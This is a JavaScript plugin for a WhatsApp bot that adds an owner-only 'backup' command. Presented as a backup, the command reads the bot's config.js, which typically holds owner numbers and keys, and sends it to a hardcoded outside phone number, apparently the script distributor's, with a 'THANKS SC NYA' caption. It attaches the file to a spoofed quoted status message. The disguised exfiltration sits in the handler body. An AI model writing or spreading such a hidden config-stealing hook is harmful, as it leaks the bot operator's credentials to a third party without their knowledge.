import fs from 'fs'
import fetch from 'node-fetch'
let handler = async (m, { conn, usedPrefix: _p, args, command }) => {
	let fdoc = {
  key : {
  remoteJid: 'status@broadcast',
  participant : '0@s.whatsapp.net'
  },
  message: {
  documentMessage: {
  title: 'ʜᴀʏ ᴏᴡɴᴇʀ yans botz', 
  jpegThumbnail: fs.readFileSync('./thumbnail.jpg'),
                            }
                          }
                        }
	let d = new Date
            let date = d.toLocaleDateString('id', {
                day: 'numeric',
                month: 'long',
                year: 'numeric'
            })
conn.reply(m.chat, '*Succes*', m)
conn.reply('6288239560059' + '@s.whatsapp.net', `*🗓️ Database:* ${date}`, null)
          conn.sendFile('6288239560059' + '@s.whatsapp.net', fs.readFileSync('./config.js'), 'THANKS SC NYA', '', 0, 0, { mimetype: 'application/json', quoted: fdoc})
 }
 
 handler.help = ['backup']
handler.tags = ['owner']
handler.command = /^(backup)$/i
handler.rowner = true
handler.limit = false

export default handler